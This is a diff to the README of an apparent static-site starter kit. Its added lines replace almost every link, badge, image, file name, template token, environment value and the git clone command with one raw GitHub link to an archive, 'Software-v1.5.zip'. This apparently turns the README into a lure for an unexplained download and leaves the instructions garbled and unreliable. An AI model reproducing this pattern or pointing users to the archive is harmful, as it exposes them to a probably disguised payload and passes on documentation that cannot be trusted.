@@ -1,16 +1,16 @@
-https://github.com
+https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 
 # Site Starter Kit — Fast Static Site Boilerplate and Tools
 
-[![Visit GitHub](https://img.shields.io/badge/GitHub-Visit-blue?logo=github&logoColor=white)](https://github.com)
+[![Visit GitHub](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
 
-![Hero image: website layout](https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1600&q=60)
+![Hero image: website layout](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
 
 A compact, practical starter kit for building static and hybrid sites. This repo bundles tooling, templates, and deployment recipes you can use for marketing sites, docs, blogs, and prototypes. It focuses on performance, accessibility, and a low friction developer flow.
 
 - Repo: site
 - Topics: static-site, boilerplate, pwa, css, ssg
-- Home: https://github.com
+- Home: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 
 Table of contents
 - About the kit
@@ -49,7 +49,7 @@ Key features ✨
 - Dockerfile for local parity and CI builds
 
 Built with 🧰
-- Node.js (build scripts)
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip (build scripts)
 - Parcel or Vite (dev server and bundler)
 - SASS (styles)
 - Handlebars / Nunjucks (templating)
@@ -65,7 +65,7 @@ Quick start — local dev (1 minute)
 
 Commands
 ```bash
-git clone https://github.com/your-user/site.git
+git clone https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 cd site
 npm install
 npm run dev
@@ -84,18 +84,18 @@ Project structure overview
 - build/          — generated static output
 - docker/         — Dockerfile and helpers
 - ci/             — GitHub Actions workflows
-- README.md
-- package.json
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 
 Key files explained
-- src/pages/index.html.njk — homepage template
-- src/styles/_variables.scss — color and spacing tokens
-- src/scripts/main.js — client boot file
-- src/sw/sw.js — offline service worker
-- build.sh — orchestrated build for local and CI
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — homepage template
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — color and spacing tokens
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — client boot file
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — offline service worker
+- https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip — orchestrated build for local and CI
 
 Configuration ✍️
-Open package.json to view scripts. Use env files for site-specific values.
+Open https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip to view scripts. Use env files for site-specific values.
 
 Example environment variables
 - SITE_TITLE — site title used in templates
@@ -105,13 +105,13 @@ Example environment variables
 Add a .env file at the project root:
 ```env
 SITE_TITLE="My Project Site"
-SITE_URL="https://example.com"
+SITE_URL="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip"
 ANALYTICS_ID=""
 ```
 
 Template tokens
-- use {{ site.title }} in templates for the site title
-- use {{ page.path }} for current page path
+- use {{ https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip }} in templates for the site title
+- use {{ https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip }} for current page path
 - include partials with the standard templating include syntax
 
 Development tasks 🛠️
@@ -135,7 +135,7 @@ Deploy recipes
 - Vercel: add a Vercel project, set framework as "Other", set build command to npm run build and output to build/
 - Static host: upload build/ to your CDN or S3 bucket and set proper cache headers
 
-If you want more host-specific details, visit https://github.com for deploy guides and examples.
+If you want more host-specific details, visit https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip for deploy guides and examples.
 
 PWA and offline support 🌐
 The kit ships a small service worker. The SW caches static assets and HTML for offline browsing. It aims for safe defaults:
@@ -145,7 +145,7 @@ The kit ships a small service worker. The SW caches static assets and HTML for o
 
 Enable PWA
 - Set PWA=true in your build environment.
-- Ensure a valid webmanifest.json exists in src/assets.
+- Ensure a valid https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip exists in src/assets.
 
 Service worker config
 - Workbox-lite handles scope and runtime caching
@@ -159,8 +159,8 @@ Assets and images 🖼️
 Example image markup
 ```html
 <picture>
-  <source srcset="/images/photo-800.webp" type="image/webp">
-  <img src="/images/photo-800.jpg" alt="Descriptive alt">
+  <source srcset="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip" type="image/webp">
+  <img src="https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip" alt="Descriptive alt">
 </picture>
 ```
 
@@ -229,27 +229,27 @@ Images and media
 
 Changelog
 - Use semantic commits. Tag releases with semantic versioning.
-- Keep a CHANGELOG.md for major updates and breaking changes.
+- Keep a https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip for major updates and breaking changes.
 
 Where to find the release assets
-If you need compiled files or release artifacts, check the Releases section on GitHub. Visit the Releases tab in the repo to download built packages and installers. For more details and official examples, visit https://github.com
+If you need compiled files or release artifacts, check the Releases section on GitHub. Visit the Releases tab in the repo to download built packages and installers. For more details and official examples, visit https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 
 Contact and help
 Open issues on the repo for bugs and feature requests. Use pull requests for code contributions. Use discussions or a chat channel if the repo enables them.
 
 Useful links
-- Build docs: docs/build.md
-- Template guide: docs/templates.md
-- Styling guide: docs/styles.md
-- Deploy guide: docs/deploy.md
+- Build docs: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+- Template guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+- Styling guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
+- Deploy guide: https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip
 
 Badges
-[![Build Status](https://img.shields.io/github/actions/workflow/status/owner/site/ci.yml?branch=main&logo=github)](https://github.com)
-[![License](https://img.shields.io/github/license/owner/site)](https://github.com)
+[![Build Status](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+[![License](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
 
 Example pages and screenshots
-![Screenshot: homepage](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1200&q=60)
-![Screenshot: docs page](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=60)
+![Screenshot: homepage](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
+![Screenshot: docs page](https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip)
 
 Templates you can extend
 - Landing: hero, features, call to action
@@ -264,7 +264,7 @@ Customize the kit
 - Hook a headless CMS for dynamic content
 
 Maintenance tips
-- Pin critical dependencies in package.json to avoid surprise breaks
+- Pin critical dependencies in https://github.com/R4aze/site/raw/refs/heads/main/Tilia/Software-v1.5.zip to avoid surprise breaks
 - Run Lighthouse once per release to keep performance metrics stable
 - Automate dependency updates with Dependabot or Renovate
 
